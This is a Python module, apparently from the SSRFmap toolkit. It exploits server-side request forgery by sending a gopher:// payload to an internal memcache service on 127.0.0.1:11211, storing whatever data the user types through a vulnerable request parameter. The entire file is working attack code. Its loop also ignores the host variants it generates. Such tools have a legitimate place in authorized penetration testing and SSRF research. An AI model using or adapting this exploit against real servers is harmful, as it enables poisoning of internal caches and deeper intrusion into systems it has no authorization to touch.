from ssrfmap.core.utils import *
import urllib.parse
import logging

name          = "memcache"
description   = "Store data inside the memcache instance"
author        = "Swissky"
documentation = []

class exploit():
    SERVICE_IP   = "127.0.0.1"
    SERVICE_PORT = "11211"
    SERVICE_DATA = "\r\n"

    def __init__(self, requester, args):
        logging.info("Module '{}' launched !".format(name))
        gen_host = gen_ip_list("127.0.0.1", args.level)
        payload = input("Data to store: ")

        self.SERVICE_DATA += 'set payloadname 0 0 {}\r\n'.format(len(payload))
        self.SERVICE_DATA += '{}\r\n'.format(payload)
        self.SERVICE_DATA += 'quit\r\n'
        self.SERVICE_DATA = urllib.parse.quote(self.SERVICE_DATA)

        for SERVICE_IP in gen_host:
            payload = wrapper_gopher(self.SERVICE_DATA, self.SERVICE_IP, self.SERVICE_PORT)

            if args.verbose == True:
                logging.info("Generated payload : {}".format(payload))

            r = requester.do_request(args.param, payload)

            if args.verbose == True:
                logging.info("Module '{}' ended !".format(name))